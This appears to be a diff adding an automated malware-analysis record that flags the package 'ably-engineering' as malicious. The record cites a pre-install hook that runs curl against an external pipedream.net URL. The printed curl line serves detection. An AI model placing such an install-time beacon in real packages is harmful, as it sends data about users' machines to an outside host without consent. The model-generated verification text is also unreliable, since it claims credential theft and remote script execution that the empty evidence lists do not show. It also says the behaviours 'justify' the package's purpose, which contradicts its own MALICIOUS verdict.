@@ -1,0 +1,55 @@
+{
+  "package_name": "ably-engineering",
+  "version": "1.0.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "data_exfiltration"
+    ],
+    "behaviors": [
+      {
+        "category": "data_exfiltration",
+        "summary": "The package contains a pre-install hook that sends data exfiltration signals to an external URL.",
+        "details": "The pre-install hook contains a curl command that sends a request to an external URL. This could potentially be used to exfiltrate sensitive data.",
+        "confidence": 0.8,
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": [
+          "https://eo7k0ogyrj0trrn.m.pipedream.net"
+        ],
+        "evidence_commands": [
+          "curl https://eo7k0ogyrj0trrn.m.pipedream.net"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials, POSTs to external domain, install hook downloads remote script, executes it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package purpose is to deploy a tool using child_process, which is not justified by the detected behaviors",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.8,
+      "explanation": "The detected behaviors form a coherent attack chain and justify the package's stated purpose"
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 1.0,
+    "confirmed_signals_count": 3,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:00:13.735437"
+}
